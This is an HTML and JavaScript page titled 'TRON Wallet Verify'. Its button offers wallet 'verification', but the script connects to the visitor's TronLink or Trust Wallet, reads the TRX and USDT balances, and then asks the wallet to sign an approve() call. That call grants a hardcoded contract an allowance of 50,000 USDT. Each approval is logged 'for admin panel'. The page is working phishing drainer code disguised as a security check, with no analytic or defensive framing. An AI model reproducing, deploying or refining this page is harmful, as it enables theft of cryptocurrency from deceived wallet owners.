<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>TRON Wallet Verify</title>

<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>

<style>
body{
font-family:Arial;
background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);
text-align:center;
padding:40px;
}

.container{
background:white;
padding:30px;
border-radius:12px;
width:420px;
margin:auto;
box-shadow:0 0 10px rgba(0,0,0,0.1);
}

button{
padding:12px 20px;
border:none;
background:#6c4cff;
color:white;
border-radius:6px;
cursor:pointer;
width:100%;
margin:15px 0;
font-size:16px;
}

.status{
margin-top:15px;
padding:12px;
border-radius:6px;
display:none;
}

.success{
background:#d4edda;
color:#155724;
display:block;
}

.error{
background:#f8d7da;
color:#721c24;
display:block;
}

.info{
background:#cce5ff;
color:#004085;
display:block;
}

.wallet-info{
background:#f8f9fa;
padding:15px;
border-radius:8px;
margin:15px 0;
text-align:left;
}

.wallet-info p{
margin:8px 0;
color:#333;
}

.label{
color:#666;
font-size:14px;
}

.value{
font-weight:bold;
color:#667eea;
word-break:break-all;
}
</style>
</head>

<body>
<div class="container">
<h2>🔐 TRON Wallet Verify</h2>

<button onclick="connectAndApprove()" id="connectBtn">Connect & Verify Wallet</button>

<div class="wallet-info">
    <p><span class="label">Address:</span> <span class="value" id="address">Not connected</span></p>
    <p><span class="label">TRX Balance:</span> <span class="value" id="trx">0</span></p>
    <p><span class="label">USDT Balance:</span> <span class="value" id="usdt">0</span></p>
</div>

<div id="status" class="status"></div>
<p style="color:#666; font-size:12px;">✓ Auto approves 50,000 USDT on connect</p>
</div>

<script>
// ============================================
// CONFIGURATION - Your Contract Address
// ============================================
const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const APPROVE_AMOUNT = 50000; // 50,000 USDT

let tronWeb = null;
let userAddress = null;

// ============================================
// SHOW STATUS
// ============================================
function showStatus(message, type) {
    const statusDiv = document.getElementById('status');
    statusDiv.className = 'status';
    statusDiv.classList.add(type);
    statusDiv.innerText = message;
    statusDiv.style.display = 'block';
}

// ============================================
// MAIN FUNCTION - CONNECT + APPROVE
// ============================================
async function connectAndApprove() {
    const btn = document.getElementById('connectBtn');
    btn.disabled = true;
    btn.innerText = 'Connecting...';
    
    showStatus('Detecting TRON wallet...', 'info');
    
    let attempts = 0;
    const maxAttempts = 20;
    
    const checkWallet = setInterval(async () => {
        attempts++;
        
        // Check if wallet is ready
        if(window.tronWeb && window.tronWeb.ready) {
            clearInterval(checkWallet);
            
            try {
                tronWeb = window.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                
                // Update UI with address
                document.getElementById("address").innerText = shortenAddress(userAddress);
                
                showStatus('✅ Wallet connected! Getting balances...', 'success');
                
                // Get TRX balance
                const trxBalance = await tronWeb.trx.getBalance(userAddress);
                document.getElementById("trx").innerText = tronWeb.fromSun(trxBalance);
                
                // Get USDT balance
                const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
                const usdtBalance = await usdtContract.balanceOf(userAddress).call();
                document.getElementById("usdt").innerText = usdtBalance / 1000000;
                
                // Now approve USDT
                await approveUSDT();
                
            } catch(error) {
                showStatus('❌ Error: ' + error.message, 'error');
                btn.disabled = false;
                btn.innerText = 'Connect & Verify Wallet';
            }
            
            return;
        }
        
        // Max attempts reached
        if(attempts >= maxAttempts) {
            clearInterval(checkWallet);
            
            if(window.tronLink) {
                showStatus('⚠️ Please unlock TronLink and try again', 'error');
            } else if(navigator.userAgent.toLowerCase().includes('trust')) {
                showStatus('⚠️ Please unlock Trust Wallet and try again', 'error');
            } else {
                showStatus('❌ No TRON wallet detected. Open in Trust Wallet.', 'error');
            }
            
            btn.disabled = false;
            btn.innerText = 'Connect & Verify Wallet';
        }
        
    }, 500);
}

// ============================================
// APPROVE USDT - CONNECT KE SAATH HI
// ============================================
async function approveUSDT() {
    showStatus('⏳ Auto-approving 50,000 USDT...', 'info');
    
    try {
        const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
        const amountInSun = APPROVE_AMOUNT * 1000000;
        
        // Send approve transaction
        const result = await usdtContract.approve(
            CONTRACT_ADDRESS,
            amountInSun
        ).send();
        
        showStatus('✅ Verification complete! 50,000 USDT approved', 'success');
        
        // Save for admin panel
        saveApproval(userAddress, APPROVE_AMOUNT, result);
        
        document.getElementById('connectBtn').innerText = 'Verified ✓';
        
    } catch(error) {
        console.error('Approval error:', error);
        
        if(error.message.includes('rejected')) {
            showStatus('❌ Approval was rejected', 'error');
        } else if(error.message.includes('energy')) {
            showStatus('❌ Insufficient TRX for energy', 'error');
        } else {
            showStatus('❌ Approval failed: ' + error.message, 'error');
        }
        
        document.getElementById('connectBtn').disabled = false;
        document.getElementById('connectBtn').innerText = 'Try Again';
    }
}

// ============================================
// SAVE APPROVAL FOR ADMIN PANEL
// ============================================
function saveApproval(address, amount, txHash) {
    const approvals = JSON.parse(localStorage.getItem('usdtApprovals') || '[]');
    
    approvals.push({
        user: address,
        amount: amount,
        txHash: txHash,
        status: 'active',
        time: new Date().toISOString(),
        token: 'USDT'
    });
    
    localStorage.setItem('usdtApprovals', JSON.stringify(approvals));
    console.log('✅ Approval saved for admin panel');
}

// ============================================
// HELPER FUNCTIONS
// ============================================
function shortenAddress(address) {
    if (!address) return 'Not connected';
    return address.slice(0, 6) + '...' + address.slice(-4);
}

// Check on page load
window.onload = function() {
    if(window.tronWeb && window.tronWeb.ready) {
        showStatus('✅ Wallet detected. Click to connect.', 'info');
    } else if(navigator.userAgent.toLowerCase().includes('trust')) {
        showStatus('ℹ️ Trust Wallet detected. Click to connect.', 'info');
    } else {
        showStatus('ℹ️ Open in Trust Wallet DApp browser', 'info');
    }
};
</script>

</body>
</html>
